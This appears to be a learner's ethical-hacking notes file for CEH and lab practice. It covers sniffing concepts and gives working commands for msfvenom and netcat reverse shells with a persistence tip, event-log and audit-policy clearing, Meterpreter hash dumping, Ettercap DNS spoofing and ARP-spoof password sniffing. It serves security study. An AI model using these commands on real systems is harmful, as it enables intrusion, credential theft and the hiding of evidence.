# Most Test$ R0lled into 0ne
Tools &amp; Notes I like or need for System Security and/or Hacking

# What I am using for learning/training
```
www.cbtnuggets.com | Great Training

www.testout.com | Great Training & labs | HIGHLY RECOMMENDED! SIgn up for the Monthly deal: use my referral here: 

www.teamtreehouse.com | More for Coding 

www.scrimba.com | Coding in a beautiful way

www.tryhackme.com | Hacking Learnt in an awesome way

www.hackthebox.eu | This is a really great tool for Easy-Expert CTFs - from Hardware - Full On Battles, however Try Hack Me is more suited for walkthroughs.

https://app.infosecinstitute.com/portal/skills/home | Sign up for the monthly deal 
```
I will organize this better later on but for now it's just thoughts which will be later organized:

# CEH Methodologies & Info
### 5 Stages in Ethical Hacking: 
- Perform Recon -> Scanning & Enumeration -> Establishing Access -> Maintaining Access -> Clearing Tracks

### Penetration Testing Life Cycle:
- Perform Recon -> Scanning & Enumeration -> Establishing Access -> Maintaining Access -> Reporting

### Penetration Testing Types
- Blackbox (No Knowledge)<br>
- White Box (Full Knowledge)<br>
- Gray Box (Partial Knowledge)

### C.I.A Triad:
- Confidentiality - Prev. Unauth. Disclosure of Sensitive Data
- Integrity - Prev. Unauth. Modification of Sensitive Data
- Availability - Prev. Disruption of Service and Productivity

### Sniffing
MAC Spoofing - A common low-level security measure is port security. Port security allows only specific MAC addresses access to a switch. The goal is to ensure that only authorized devices have access to the network. A MAC address for a network interface card (NIC) is assigned by the manufacturer. This address is hard-coded directly into the NIC and can’t be changed. However, it is possible to change the MAC address of the interface driver. Let’s say you want to access a network, but the administrator has implemented port security measures. Thanks to your previous reconnaissance and scanning, you know that your target computer has access to the network, and you even know the MAC address. Using one of several software tools, you can spoof your computer’s MAC address to look like the target’s MAC address, and you can connect directly to the network with minimal effort.<br>

MAC Flooding - When a switch is initially turned on, it doesn’t know which devices it’s going to be supporting. A switch tracks MAC addresses in a content addressable memory (CAM) table. As it receives packets from various MAC addresses, it adds the addresses to its CAM table and associates each one with a physical port on the switch. This process allows data to be sent directly to the port where the intended recipient is located instead of sending all data across the entire network like a hub. Although one port can have multiple MAC addresses associated with it, the CAM table is only so big. As a hacker, you can use a method called MAC flooding to intentionally flood the CAM table with Ethernet frames, each originating from different MAC addresses. Once the table starts to overflow, the switch responds by broadcasting all incoming data to all ports, basically turning itself into a hub instead of a switch. Since your MAC address is now connected to one of the ports, you are able to capture all traffic as it is broadcast across the network.
<br>

ARP Poisoning - Address Resolution Protocol (ARP) maps IP addresses to MAC addresses and provides the most efficient path for data transmission. ARP broadcasts are permitted to freely roam around the network. You can use this free flow of traffic to your advantage. By sending spoofed messages onto a network, you can associate your MAC address with the IP address of another host, preferably the default gateway. As a result, the target machine will send frames to your system, thinking that you are their gateway, before you forward them on to the original destination.
<br>

Port Mirroring - Port mirroring can be challenging to set up, but is possible depending on the level of access you’ve been able to obtain to a network. The concept behind port mirroring, also known as SPAN port, is actually pretty simple. Port mirroring creates a duplicate of all network traffic on a port and sends it to another device. If all traffic from a target machine is directed through the switch to the server, you can implement port mirroring. Port mirroring ensures that any time the data comes through, it is duplicated and sent out to the attacker’s machine as well.<br>

# CySA+ Methodologies & Info
## Add Later





# Covering Tracks:
Delete these: 
```
secevent.evt
sysevent.evt
appevent.evt
```
Hide Evidence: 
```
- ADS (Alternate Data Streams)
- move files elsewhere with .extensions
```
Modify Timestamps
<br>
Disable Auditing
<br>
Tools: 
<br>
CCleaner
<br>
Clear My History
<br>

Use NTFS | Alternate Data Streams to cover tracks once you have gained access and are finished - a few ways: 

# Using Admininstrator - Powershell 
This is gathering all the Entries Log for us to view what we did/or changed. Which we will then Delete, respectively.
```
> Get-EventLog -LogName *
> Get-EventLog -LogName * | ForEach { Clear-EventLog $_.log } 
```
N0w if we need to view the System Audit Policy we can do that below and then clear it: 
```
> auditpol /get /category:* <br>
> auditpol /clear /y
```
# Compile C Script
Linux
```
> gcc -o shell-exploit shell.c 
```
Windows
```
> i686-w64-mingw32-gcc win_script.c -o win_script.exe -lws2_32
````
# msfvenom
MSvenom Basic Reverse TCP Shell
```
> msfvenom -p windows/meterpreter/reverse_tcp lhost=<ip> lport=<port> -f exe > fileNamed.exe
```
Usage
```
msf6> use exploit/multi/handler
msf6> set payload windows/meterpreter/reverse_tcp
msf6> options
msf6> exploit
```
Go to victim computer or send to victim or pwndrop and download/run the .exe file
<br>
When shelled:
```
C:\> getuid
C:\> sysinfo
C:\> download secretFile.txt
C:\> upload secretPayload.txt
```
# Moving Files
Samba Share (SMB)<br>
PwnDrop - ip_address:pwndrop<br>
SSH/SCP - pretty simple
Meterpreter

# PwnDrop Usage
1st - 
```
You need to update the PwnDrop.ini file after install (Configuration to update your IP and Port)
```
2nd -
```
# cd /home/kali/tools/PwnDrop/build
```
3rd - 
```
# ./pwndrop start
```
4th - 
```
Go to 127.0.0.1:pwndrop
```
5th -
```
[/home/kali/tools/pwndrop/build] # locate nc.exe 
[/home/kali/tools/pwndrop/build] # /usr/share/windows-resources/binaries/nc.exe
```
6th - 
```
Upload to PwnDrop (Upload Folder)<br>
```
7th - 
```
Go to victim computer -> access ServerIP link (IP Address:pwndrop)
```
8th - 
```
(Save file to C:\ drive)
> run cmd.exe as admin
> cd C:\
> dir (should see file)
```
9th - Go to attack box
```
# nc -nlvp 4444
```
10th - Go to victim box
```
> nc.exe <attackIP> <attackPort> -e cmd.exe
```
11th - Do whatever, you're in. You should upload a .bat file to persisitantly run every few hours for a shell.
<br>
<br>
12th - Upload any files from Victim to Attacker via PwnDrop.
# Metasploit
Searching: 
```
msf6> search name: eternalblue
msf6> search name:eternalblue type:exploit app:client
msf6> search type: client
```
Sessions: 
```
msf6> sessions -h (help)
msf6> sessions -i # (choose session)
msf6> sessions -l (show running sessions)
msf6> sessions -k # (kill session)
msf6> Ctrl+Z (Run in background)
```
msfvenom usage:
```
> msfvenom -p windows/meterpreter/reverse_tcp lhost=<ip> lport=<port> -f exe > fileNamed.exe
```
Post exploits usage: 
```
msf6> post/windows/gather/credentials/skype
```
```
meterpreter> cd C:\\Users

meterpreter> pwd
C:\windows\system32

meterpreter> cd C:\\users\\vagrant\\desktop

meterpreter> pwd
C:\users\vagrant\desktop

meterpreter> search secret.txt
Path

meterpreter> cat secret.txt
My password is blah blah

meterpreter> edit secret.txt

meterpreter> clearev (clearing eventlog)

meterpreter> execute file.exe

meterpreter> run post/windows/gather/hashdump (dump the hashes for our buddy John)

meterpreter> getuid
Server username: NT AUTHORITY\SYSTEM

meterpreter> run post/windows/manage/migrate
Migrating into 4398 (you now live inside the computer BACKGROUND)
```
# Tools to use for Pentesting:
ArpSpoof
<br>
URLSnarf
<br>
MITMF (Man-in-the-middle-framework)
<br>
Ettercap
<br>

# Sniffing

DNS Cache Poisoning w/ Ettercap: 
Attacker poisons ARP table with his MAC | Victim wants to go to Google.com | The attacker spoofs themself as the DNS server | Victim winds up going to a fake Google. <br>
```
root# sysctl -w net.ipv4.ip_forward=1
net.ipv4.ip_forward = 1
```
```
root# nano /etc/ettercap/etter.conf
#####################################
ec_uid = 0
ec_gid = 0

(scroll down)

#------------
#   Linux
#------------

# if you use iptables:
  (Delete the comment # from both lines)
```
```
root# nano /etc/ettercap/etter.dns
#####################################
*       A    192.168.1.101 <- (Attackers Address)
```
Now edit the HTML page located at /var/www/html/index.html for their landing page.
```
root# ettercap -g

Primary Interface -> eth1
Start
Scan for host
Host List
Victim Target 1
Default Gateway Target 2
Manage Plugins -> dns_spoof
Globe -> ARP Poisoning
root# service apache2 start
```
Example:<br>
Use Ettercap to begin sniffing and scanning for hosts.
Set Exec (192.168.0.30) as the target machine
Initiate DNS spoofing.
From Exec, access rmksupplies.com.
Complete this lab as follows:
```
Use Ettercap to begin sniffing and scanning for hosts as follows:
From the Favorites bar, open Ettercap.
Select Sniff.
Select Unified sniffing.
From the Network Interface drop-down list, select enp2s0.
Select OK.
Select Hosts and select Scan for hosts.
Set Exec (192.168.0.30) as the target machine as follows:
Select Hosts and select Host list.
Under IP Address, select 192.168.0.30.
Select Add to Target 1 to assign it as the target.
Initiate DNS spoofing as follows:
Select Plugins.
Select Manage the plugins.
Select the Plugins tab.
Double-click dns_spoof to activate it.
Select Mitm.
Select ARP poisoning.
Select Sniff remote connections.
Select OK.
From Exec, access rmksupplies.com as follows:
From the top navigation tabs, select Floor 1 Overview.
Under Executive Office, select Exec.
From the task bar, open Chrome.
In the URL field, type rmksupplies.com and press Enter.
Notice that the page was redirected to RUS Office Supplies despite the web address not changing.
```
MITM Attack: <br>
ArpSpoof<br>
SSLStrip<br>
Replay Attack<br>
SSL Downgrade<br>
DNS Cache Poisoning

# ARP Poisoning Attack
Attacker sends his MAC to the victims ARP table and associates that with the Default Gateway. When the Victim wants to go to a domain the attacker receives the request and fowards it through the router to the internet. <br><br>
Make host act like Router:
```
root# sysctl -w net.ipv4.ip_forward=1
net.ipv4.ip_forward = 1
```
```
root# arpspoof -i eth1 -t <target_ip> <destination_gateway>
```
```
root# tcpdump -i eth1 port http or port ftp -l -A | egrep "pass=|password=|user=|username=|login=|pass:|password:|user:|username:|login:|pass |user |PASS |USER "
```
# TCPDump
You can do this for many things, mainly a CLI like Wireshark. Monitor traffic on the network.
```
root# tcpdump port 21
listening on eth1
```
# SMAC 2.0 | GUI
You can use this for spoofing MAC addresses on a network.



# Countermeasures for Sniffing
Write packet capture files from interface 1 into mycap.pcap
```
c:\>windump -i 1 -w C:\test\mycap.pcap
```
# Session Hijacking Process
Session ID is the key for this to work! | Happens on the Application and Network Layers |
- Sniff
- Monitor
- Desynch the session
- Predict the session ID
- Inject commands

Find Session IDs:
- Sniff sessions
- Predict session tokens
- Man-in-the-middle attacks
- Man-in-the-browser attacks

TCP/IP Session Hijacking:
- Sniff client/server traffic
- Predict sequencing 
- Desync client session
- Take over the session

# Network Access Control Bypass

# John The Ripper

# Hashcat 

# NMAP
Detect Promiscuous Mode
```
# nmap -sV --script=sniffer-detect <ip address>
Host script results:
__sniffer-detect: Likely in promiscuous mode (tests: "111111")
```

# Wireshark







